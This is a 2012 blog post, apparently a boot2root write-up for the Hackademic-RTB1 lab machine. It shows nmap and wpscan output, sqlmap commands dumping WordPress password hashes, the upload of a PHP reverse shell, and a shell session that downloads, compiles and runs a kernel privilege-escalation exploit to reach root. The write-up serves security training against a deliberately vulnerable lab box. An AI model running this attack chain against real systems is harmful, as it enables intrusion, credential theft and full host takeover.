@@ -1,0 +1,812 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Solving Hackademic-RTB1 - forelsec</title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="Hackademic is a pseudo-realistic boot2root box that aims for realism over puzzles or steganography (or obscurity like pwn0s2..). With that, lets &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2012/11/13/solving-hackademic-rtb1">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="forelsec" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <header role="banner"><hgroup>
+  <h1><a href="/">forelsec</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/code">Code</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Solving Hackademic-RTB1</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-11-13T01:24:24-07:00" pubdate data-updated="true">Nov 13<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Hackademic is a pseudo-realistic boot2root box that aims for realism over puzzles or steganography (or obscurity like pwn0s2..).  With that, lets start:</p>
+
+<p>The initial scan:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># Nmap 6.01 scan initiated Tue Nov 13 22:16:40 2012 as: nmap -sSV -F -T5 -oN hack.scan 192.168.1.168
+</span><span class='line'>Nmap scan report for 192.168.1.168
+</span><span class='line'>Host is up (0.00028s latency).
+</span><span class='line'>Not shown: 98 filtered ports
+</span><span class='line'>PORT   STATE  SERVICE VERSION
+</span><span class='line'>22/tcp closed ssh
+</span><span class='line'>80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
+</span><span class='line'>MAC Address: 08:00:27:3A:9D:2B (Cadmus Computer Systems)
+</span><span class='line'>
+</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'># Nmap done at Tue Nov 13 22:16:48 2012 -- 1 IP address (1 host up) scanned in 7.87 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A &lsquo;closed&rsquo; responding ssh and an HTTP server.  Navigating to the site gives us a lovely Wordpress.  Running wpscan..</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:/pentest/web/wpscan# ruby wpscan.rb --url http://192.168.1.168/Hackademic_RTB1/
+</span><span class='line'>____________________________________________________
+</span><span class='line'> __          _______   _____                  
+</span><span class='line'> \ \        / /  __ \ / ____|                 
+</span><span class='line'>  \ \  /\  / /| |__) | (___   ___  __ _ _ __  
+</span><span class='line'>   \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
+</span><span class='line'>    \  /\  /  | |     ____) | (__| (_| | | | |
+</span><span class='line'>     \/  \/   |_|    |_____/ \___|\__,_|_| |_| v2.0r7491288
+</span><span class='line'>
+</span><span class='line'>    WordPress Security Scanner by the WPScan Team
+</span><span class='line'> Sponsored by the RandomStorm Open Source Initiative
+</span><span class='line'>_____________________________________________________
+</span><span class='line'>
+</span><span class='line'>| URL: http://192.168.1.168/Hackademic_RTB1/
+</span><span class='line'>| Started on Tue Nov 13 22:20:45 2012
+</span><span class='line'>
+</span><span class='line'>[!] The WordPress 'http://192.168.1.168/Hackademic_RTB1/readme.html' file exists
+</span><span class='line'>[+] WordPress version 1.5.1.1 identified from meta generator
+</span><span class='line'>
+</span><span class='line'>[!] We have identified 2 vulnerabilities from the version number :
+</span><span class='line'>
+</span><span class='line'> | * Title: WordPress &lt;= 1.5.1.1 "add new admin" SQL Injection Exploit
+</span><span class='line'> | * Reference: http://www.exploit-db.com/exploits/1059/
+</span><span class='line'>
+</span><span class='line'> | * Title: WordPress &lt;= 1.5.1.1 SQL Injection Exploit 
+</span><span class='line'> | * Reference: http://www.exploit-db.com/exploits/1033/
+</span><span class='line'>
+</span><span class='line'>[+] Enumerating plugins from passive detection ... 
+</span><span class='line'>No plugins found :(
+</span><span class='line'>
+</span><span class='line'>[+] Finished at Tue Nov 13 22:20:45 2012
+</span><span class='line'>[+] Elapsed time: 00:00:00
+</span><span class='line'>root@bt:/pentest/web/wpscan# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Clearly a Wordpress, and quite clearly a very old version.  I couldn&rsquo;t get the listed add admin exploit to work, so I played around with SQLi:</p>
+
+<p><img src="/images/posts/2012/hrt_1.jpg"></p>
+
+<p>The backend appears to be running as root.  Switching over to sqlmap, we can iterate through the backend much quicker:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:/pentest/database/sqlmap# python sqlmap.py --url http://192.168.1.168/Hackademic_RTB1/?cat=0 --users --passwords
+</span><span class='line'>
+</span><span class='line'>[22:29:16] [INFO] resuming back-end DBMS 'mysql' 
+</span><span class='line'>[22:29:16] [INFO] testing connection to the target url
+</span><span class='line'>[22:29:16] [INFO] the back-end DBMS is MySQL
+</span><span class='line'>web server operating system: Linux Fedora 13 (Goddard)
+</span><span class='line'>web application technology: PHP 5.3.3, Apache 2.2.15
+</span><span class='line'>back-end DBMS: MySQL 5.0
+</span><span class='line'>[22:29:16] [INFO] fetching database users
+</span><span class='line'>[22:29:16] [INFO] the SQL query used returns 27 entries
+</span><span class='line'>database management system users [1]:
+</span><span class='line'>[*] 'root'@'localhost'
+</span><span class='line'>
+</span><span class='line'>[22:29:16] [INFO] fetching database users password hashes
+</span><span class='line'>[22:29:17] [INFO] the SQL query used returns 1 entries
+</span><span class='line'>[22:29:17] [INFO] resumed: root
+</span><span class='line'>[22:29:17] [INFO] resumed: 2eaec110380126d7
+</span><span class='line'>do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] n
+</span><span class='line'>database management system users password hashes:
+</span><span class='line'>[*] root [1]:
+</span><span class='line'>    password hash: 2eaec110380126d7
+</span><span class='line'>
+</span><span class='line'>[22:29:18] [INFO] fetched data logged to text files under '/pentest/database/sqlmap/output/192.168.1.168'
+</span><span class='line'>
+</span><span class='line'>[*] shutting down at 22:29:18
+</span><span class='line'>
+</span><span class='line'>root@bt:/pentest/database/sqlmap# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>There&rsquo;s the &lsquo;mysql&rsquo; root hash, which appears to be an old style hash.  Moving forward&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:/pentest/database/sqlmap# python sqlmap.py --url http://192.168.1.168/Hackademic_RTB1/?cat=0 --current-db
+</span><span class='line'>
+</span><span class='line'>[22:32:10] [INFO] resuming back-end DBMS 'mysql' 
+</span><span class='line'>[22:32:10] [INFO] testing connection to the target url
+</span><span class='line'>[22:32:10] [INFO] the back-end DBMS is MySQL
+</span><span class='line'>web server operating system: Linux Fedora 13 (Goddard)
+</span><span class='line'>web application technology: PHP 5.3.3, Apache 2.2.15
+</span><span class='line'>back-end DBMS: MySQL 5.0
+</span><span class='line'>[22:32:10] [INFO] fetching current database
+</span><span class='line'>[22:32:10] [INFO] resumed: wordpress
+</span><span class='line'>current database:    'wordpress'
+</span><span class='line'>
+</span><span class='line'>[*] shutting down at 22:32:10
+</span><span class='line'>
+</span><span class='line'>root@bt:/pentest/database/sqlmap# python sqlmap.py --url http://192.168.1.168/Hackademic_RTB1/?cat=0 -D wordpress --tables
+</span><span class='line'>
+</span><span class='line'>[22:33:47] [INFO] resuming back-end DBMS 'mysql' 
+</span><span class='line'>[22:33:48] [INFO] the back-end DBMS is MySQL
+</span><span class='line'>web server operating system: Linux Fedora 13 (Goddard)
+</span><span class='line'>web application technology: PHP 5.3.3, Apache 2.2.15
+</span><span class='line'>back-end DBMS: MySQL 5.0
+</span><span class='line'>[22:33:48] [INFO] fetching tables for database: 'wordpress'
+</span><span class='line'>[22:33:48] [INFO] the SQL query used returns 9 entries
+</span><span class='line'>[22:33:48] [INFO] resumed: wp_categories
+</span><span class='line'>[22:33:48] [INFO] resumed: wp_comments
+</span><span class='line'>[22:33:48] [INFO] resumed: wp_linkcategories
+</span><span class='line'>[22:33:48] [INFO] resumed: wp_links
+</span><span class='line'>[22:33:48] [INFO] resumed: wp_options
+</span><span class='line'>[22:33:48] [INFO] resumed: wp_post2cat
+</span><span class='line'>[22:33:48] [INFO] resumed: wp_postmeta
+</span><span class='line'>[22:33:48] [INFO] resumed: wp_posts
+</span><span class='line'>[22:33:48] [INFO] resumed: wp_users
+</span><span class='line'>Database: wordpress
+</span><span class='line'>[9 tables]
+</span><span class='line'>+-------------------+
+</span><span class='line'>| wp_categories     |
+</span><span class='line'>| wp_comments       |
+</span><span class='line'>| wp_linkcategories |
+</span><span class='line'>| wp_links          |
+</span><span class='line'>| wp_options        |
+</span><span class='line'>| wp_post2cat       |
+</span><span class='line'>| wp_postmeta       |
+</span><span class='line'>| wp_posts          |
+</span><span class='line'>| wp_users          |
+</span><span class='line'>+-------------------+
+</span><span class='line'>
+</span><span class='line'>[*] shutting down at 22:33:48
+</span><span class='line'>
+</span><span class='line'>root@bt:/pentest/database/sqlmap# python sqlmap.py --url http://192.168.1.168/Hackademic_RTB1/?cat=0 -D wordpress -T wp_users --columns
+</span><span class='line'>[22:36:06] [INFO] resuming back-end DBMS 'mysql' 
+</span><span class='line'>
+</span><span class='line'>[22:36:06] [INFO] the back-end DBMS is MySQL
+</span><span class='line'>web server operating system: Linux Fedora 13 (Goddard)
+</span><span class='line'>web application technology: PHP 5.3.3, Apache 2.2.15
+</span><span class='line'>back-end DBMS: MySQL 5.0
+</span><span class='line'>[22:36:06] [INFO] fetching columns for table 'wp_users' in database 'wordpress'
+</span><span class='line'>[22:36:06] [WARNING] the SQL query provided does not return any output
+</span><span class='line'>[22:36:06] [INFO] the SQL query used returns 22 entries
+</span><span class='line'>Database: wordpress
+</span><span class='line'>Table: wp_users
+</span><span class='line'>[22 columns]
+</span><span class='line'>+---------------------+---------------------+
+</span><span class='line'>| Column              | Type                |
+</span><span class='line'>+---------------------+---------------------+
+</span><span class='line'>| ID                  | bigint(20) unsigned |
+</span><span class='line'>| user_activation_key | varchar(60)         |
+</span><span class='line'>| user_aim            | varchar(50)         |
+</span><span class='line'>| user_browser        | varchar(200)        |
+</span><span class='line'>| user_description    | longtext            |
+</span><span class='line'>| user_domain         | varchar(200)        |
+</span><span class='line'>| user_email          | varchar(100)        |
+</span><span class='line'>| user_firstname      | varchar(50)         |
+</span><span class='line'>| user_icq            | int(10) unsigned    |
+</span><span class='line'>| user_idmode         | varchar(20)         |
+</span><span class='line'>| user_ip             | varchar(15)         |
+</span><span class='line'>| user_lastname       | varchar(50)         |
+</span><span class='line'>| user_level          | int(2) unsigned     |
+</span><span class='line'>| user_login          | varchar(60)         |
+</span><span class='line'>| user_msn            | varchar(100)        |
+</span><span class='line'>| user_nicename       | varchar(50)         |
+</span><span class='line'>| user_nickname       | varchar(50)         |
+</span><span class='line'>| user_pass           | varchar(64)         |
+</span><span class='line'>| user_registered     | datetime            |
+</span><span class='line'>| user_status         | int(11)             |
+</span><span class='line'>| user_url            | varchar(100)        |
+</span><span class='line'>| user_yim            | varchar(50)         |
+</span><span class='line'>+---------------------+---------------------+
+</span><span class='line'>
+</span><span class='line'>[*] shutting down at 22:36:06
+</span><span class='line'>
+</span><span class='line'>root@bt:/pentest/database/sqlmap# python sqlmap.py --url http://192.168.1.168/Hackademic_RTB1/?cat=0 -D wordpress -T wp_users -C user_pass,user_login,user_level --dump
+</span><span class='line'>
+</span><span class='line'>[*] starting at 22:38:47
+</span><span class='line'>
+</span><span class='line'>[22:38:47] [INFO] resuming back-end DBMS 'mysql' 
+</span><span class='line'>[22:38:47] [INFO] the back-end DBMS is MySQL
+</span><span class='line'>web server operating system: Linux Fedora 13 (Goddard)
+</span><span class='line'>web application technology: PHP 5.3.3, Apache 2.2.15
+</span><span class='line'>back-end DBMS: MySQL 5.0
+</span><span class='line'>[22:38:47] [INFO] fetching entries of column(s) 'user_level, user_login, user_pass' for table 'wp_users' in database 'wordpress'
+</span><span class='line'>[22:38:47] [INFO] the SQL query used returns 6 entries
+</span><span class='line'>Database: wordpress
+</span><span class='line'>Table: wp_users
+</span><span class='line'>[6 entries]
+</span><span class='line'>+----------------------------------+--------------+------------+
+</span><span class='line'>| user_pass                        | user_login   | user_level |
+</span><span class='line'>+----------------------------------+--------------+------------+
+</span><span class='line'>| 21232f297a57a5a743894a0e4a801fc3 | NickJames    | 1          |
+</span><span class='line'>| 50484c19f1afdaf3841a0d821ed393d2 | MaxBucky     | 0          |
+</span><span class='line'>| 7cbb3252ba6b7e9c422fac5334d22054 | GeorgeMiller | 10         |
+</span><span class='line'>| 8601f6e1028a8e8a966f6c33fcd9aec4 | JasonKonnors | 0          |
+</span><span class='line'>| a6e514f9486b83cb53d8d932f9a04292 | TonyBlack    | 0          |
+</span><span class='line'>| b986448f0bb9e5e124ca91d3d650f52c | JohnSmith    | 0          |
+</span><span class='line'>+----------------------------------+--------------+------------+
+</span><span class='line'>
+</span><span class='line'>[*] shutting down at 22:38:50
+</span><span class='line'>
+</span><span class='line'>root@bt:/pentest/database/sqlmap# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>user_level</code> determines their level of access on the Wordpress, with 1 being basic and 10 being administrator.  You can guess which account we went after:</p>
+
+<p><img src="/images/posts/2012/hrt_2.jpg"></p>
+
+<p>Now we&rsquo;ve got an administrative account on the Wordpress.  It&rsquo;s a very basic, very old, Wordpress.  How can we go about getting shell access?</p>
+
+<p><img src="/images/posts/2012/hrt_3.jpg"></p>
+
+<p>By allowing file uploads, increasing the maximum size and adding to the allowable file extensions, we can upload the fantastic <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">PHP reverse shell</a>.  Then all we need to do is open up a netcat listener and navigate to the PHP file in wp-content/&hellip;</p>
+
+<p><img src="/images/posts/2012/hrt_4.jpg"></p>
+
+<p>Now we&rsquo;ve got a shell.  Some enumeration&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.0$ uname -a
+</span><span class='line'>uname -a
+</span><span class='line'>Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
+</span><span class='line'>sh-4.0$ netstat -vant
+</span><span class='line'>netstat -vant
+</span><span class='line'>Active Internet connections (servers and established)
+</span><span class='line'>Proto Recv-Q Send-Q Local Address               Foreign Address             State      
+</span><span class='line'>tcp        0      0 0.0.0.0:3306                0.0.0.0:*                   LISTEN      
+</span><span class='line'>tcp        0      0 127.0.0.1:631               0.0.0.0:*                   LISTEN      
+</span><span class='line'>tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      
+</span><span class='line'>tcp        0      0 192.168.1.168:47372         192.168.1.232:1234          ESTABLISHED 
+</span><span class='line'>tcp        0      0 :::80                       :::*                        LISTEN      
+</span><span class='line'>tcp        0      0 ::1:631                     :::*                        LISTEN      
+</span><span class='line'>tcp        0      0 ::ffff:192.168.1.168:80     ::ffff:192.168.1.118:54299  ESTABLISHED 
+</span><span class='line'>sh-4.0$ whoami
+</span><span class='line'>whoami
+</span><span class='line'>apache
+</span><span class='line'>sh-4.0$ </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Odd that MySQL is listening on 0.0.0.0, but we couldn&rsquo;t find it on a scan.  Likely iptable rules in place, but we need root first.  How&rsquo;s about a kernel <a href="http://downloads.securityfocus.com/vulnerabilities/exploits/44219.c">privilege escalation vulnerability</a>?</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.0$ cd /tmp                     
+</span><span class='line'>cd /tmp
+</span><span class='line'>sh-4.0$ wget downloads.securityfocus.com/vulnerabilities/exploits/44219.c
+</span><span class='line'>wget downloads.securityfocus.com/vulnerabilities/exploits/44219.c
+</span><span class='line'>--2012-11-14 06:52:05--  http://downloads.securityfocus.com/vulnerabilities/exploits/44219.c
+</span><span class='line'>Resolving downloads.securityfocus.com... 143.127.139.111
+</span><span class='line'>Connecting to downloads.securityfocus.com|143.127.139.111|:80... connected.
+</span><span class='line'>HTTP request sent, awaiting response... 200 OK
+</span><span class='line'>Length: 6804 (6.6K) [text/plain]
+</span><span class='line'>Saving to: `44219.c'
+</span><span class='line'>
+</span><span class='line'>     0K ......                                                100% 72.1K=0.09s
+</span><span class='line'>
+</span><span class='line'>2012-11-14 06:52:05 (72.1 KB/s) - `44219.c' saved [6804/6804]
+</span><span class='line'>
+</span><span class='line'>sh-4.0$ gcc 44219.c -o sploit
+</span><span class='line'>gcc 44219.c -o sploit
+</span><span class='line'>sh-4.0$ ./sploit
+</span><span class='line'>./sploit
+</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
+</span><span class='line'>[*] by Dan Rosenberg
+</span><span class='line'>[*] Resolving kernel addresses...
+</span><span class='line'> [+] Resolved security_ops to 0xc0aa19ac
+</span><span class='line'> [+] Resolved default_security_ops to 0xc0955c6c
+</span><span class='line'> [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+</span><span class='line'> [+] Resolved commit_creds to 0xc044e5f1
+</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc044e452
+</span><span class='line'>[*] Overwriting security ops...
+</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
+</span><span class='line'>[*] by Dan Rosenberg
+</span><span class='line'>[*] Resolving kernel addresses...
+</span><span class='line'> [+] Resolved security_ops to 0xc0aa19ac
+</span><span class='line'> [+] Resolved default_security_ops to 0xc0955c6c
+</span><span class='line'> [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+</span><span class='line'> [+] Resolved commit_creds to 0xc044e5f1
+</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc044e452
+</span><span class='line'>[*] Overwriting security ops...
+</span><span class='line'>[*] Overwriting function pointer...
+</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
+</span><span class='line'>[*] by Dan Rosenberg
+</span><span class='line'>[*] Resolving kernel addresses...
+</span><span class='line'> [+] Resolved security_ops to 0xc0aa19ac
+</span><span class='line'> [+] Resolved default_security_ops to 0xc0955c6c
+</span><span class='line'> [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+</span><span class='line'> [+] Resolved commit_creds to 0xc044e5f1
+</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc044e452
+</span><span class='line'>[*] Overwriting security ops...
+</span><span class='line'>[*] Overwriting function pointer...
+</span><span class='line'>[*] Triggering payload...
+</span><span class='line'>[*] Restoring function pointer...
+</span><span class='line'>whoami
+</span><span class='line'>root
+</span><span class='line'>cd /root/                                                                       
+</span><span class='line'>ls
+</span><span class='line'>Desktop
+</span><span class='line'>anaconda-ks.cfg
+</span><span class='line'>key.txt
+</span><span class='line'>key.txt~
+</span><span class='line'>cat key.txt
+</span><span class='line'>Yeah!!
+</span><span class='line'>You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)
+</span><span class='line'>
+</span><span class='line'>$_d&jgQ&gt;&gt;ak\#b"(Hx"o&lt;la_%
+</span><span class='line'>
+</span><span class='line'>Regards,
+</span><span class='line'>mr.pr0n || p0wnbox.Team || 2011
+</span><span class='line'>http://p0wnbox.com</span></code></pre></td></tr></table></div></figure>
+
+
